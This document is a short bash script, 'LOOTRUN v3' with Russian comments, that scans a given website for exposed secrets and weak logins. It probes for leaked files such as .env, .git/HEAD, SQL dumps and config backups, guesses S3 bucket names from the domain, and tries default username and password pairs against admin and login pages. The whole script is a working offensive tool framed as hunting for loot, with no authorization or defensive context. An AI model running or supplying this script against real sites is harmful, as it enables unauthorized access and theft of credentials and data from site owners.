#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')

echo "[LOOTRUN v3] Быстрый поиск сокровищ..."

# Критичные файлы
for f in /.git/HEAD /.env /.env.backup /wp-config.php.bak /dump.sql /backup.zip /phpinfo.php; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$f" 2>/dev/null)
    [ "$code" = "200" ] && echo "  💰 $f [HTTP $code]"
done

# S3 бакеты
for bucket in "$DOMAIN" "backup.$DOMAIN" "static.$DOMAIN" "db.$DOMAIN"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "http://$bucket.s3.amazonaws.com" 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  🪣 S3: $bucket [HTTP $code]"
done

# Дефолтные пароли
for path in /admin /login /wp-admin; do
    for cred in "admin:admin" "admin:password" "admin:123456" "root:root"; do
        user="${cred%%:*}"; pass="${cred##*:}"
        code=$(curl -sk -d "username=$user&password=$pass" -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$path" 2>/dev/null)
        [ "$code" = "302" ] && echo "  🔑 ДЕФОЛТ: $cred @ $path"
    done
done

echo "[LOOTRUN v3] Готово"
